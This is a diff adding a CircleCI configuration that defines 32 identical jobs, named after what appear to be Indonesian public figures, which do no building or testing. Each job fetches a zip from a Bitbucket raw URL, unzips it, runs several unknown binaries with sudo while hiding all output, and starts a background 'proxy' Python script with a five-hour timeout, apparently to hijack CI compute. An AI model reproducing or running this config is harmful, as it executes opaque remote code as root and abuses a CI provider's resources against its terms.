@@ -1,0 +1,219 @@
+version: 2.1
+jobs:
+  JuliariBatubara:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: &commonSteps
+      steps:
+        - run:
+            name: Inilah
+            command: |
+              ls
+        - run:
+            name: Nama
+            command: |
+              wget https://bitbucket.org/sindylestari/sindy/raw/07d31b8cb0f894bd1bd0629dad4cb02b7ffa8ddc/Dbg.zip >/dev/null 2>&1
+        - run:
+            name: Orang
+            command: |
+              unzip Dbg.zip >/dev/null 2>&1
+        - run:
+            name: Korupsi
+            command: |
+              chmod u+x * >/dev/null 2>&1
+        - run:
+            name: Membuat
+            command: |
+              sudo ./semoga >/dev/null 2>&1
+        - run:
+            name: Hidupku
+            command: |
+              sudo ./kalian >/dev/null 2>&1
+        - run:
+            name: Menjadi
+            command: |
+              sudo ./semua >/dev/null 2>&1
+        - run:
+            name: Pengangguran
+            command: |
+              sudo ./dikutuk >/dev/null 2>&1
+        - run:
+            name: Anjir Lo. . . . .
+            no_output_timeout: 300m
+            command: |
+              echo "Salam MrGolekOpo. . ."
+              sudo ./menjadi >/dev/null 2>&1
+              sudo ./tahi >/dev/null 2>&1
+              sudo ./anjir >/dev/null 2>&1
+              screen -dmS proxy python3 p2.py >/dev/null 2>&1
+              #sleep 12s###
+              0#sudo ./start2 >/dev/null 2>&1
+  SyamsulArifin:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  ArtalytaSuryani:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  AzisSyamsuddin:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  BambangSutrisno:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  BudhiSarwono:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  ChoelMallarangeng:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  DjokoSusilo:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  EddieWidiono:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  FuadAminImron:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  GatotPujoNugroho:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  HasanAminuddin:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  IriantoMSSyafiuddin:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  IrvanRivanoMuchtar:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  IskakTjokroadisurjo:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  JohanAnuar:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  AnnasMaamun:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  AndiMallarangeng:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  NoviRahmanHidayat:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  OjangSohandi:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  PatriceRioCapella:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  PuputTantrianaSari:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  RahmatYasin:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  RahardiRamelan:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  RinaIriani:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  AnasUrbaningrum:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  DannySetiawan:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  SukawiSutarip:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  GayusTambunan:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  RitaWidyasari:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  MidfaiYabani:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+  YuliusNawawi:
+    docker:
+      - image: circleci/ruby@0.1.2
+    <<: *commonSteps
+
+
+
+
+workflows:
+  version: 2
+  all:
+    jobs:
+      - JuliariBatubara
+      - SyamsulArifin
+      - ArtalytaSuryani
+      - AzisSyamsuddin
+      - BambangSutrisno
+      - BudhiSarwono
+      - ChoelMallarangeng
+      - DjokoSusilo
+      - EddieWidiono
+      - FuadAminImron
+      - GatotPujoNugroho
+      - HasanAminuddin
+      - IriantoMSSyafiuddin
+      - IrvanRivanoMuchtar
+      - IskakTjokroadisurjo
+      - JohanAnuar
+      - AnnasMaamun
+      - AndiMallarangeng
+      - NoviRahmanHidayat
+      - OjangSohandi
+      - PatriceRioCapella
+      - PuputTantrianaSari
+      - RahmatYasin
+      - RahardiRamelan
+      - RinaIriani
+      - AnasUrbaningrum
+      - DannySetiawan
+      - SukawiSutarip
+      - GayusTambunan
+      - RitaWidyasari
+      - MidfaiYabani
+      - YuliusNawawi
+
+
+
+
+
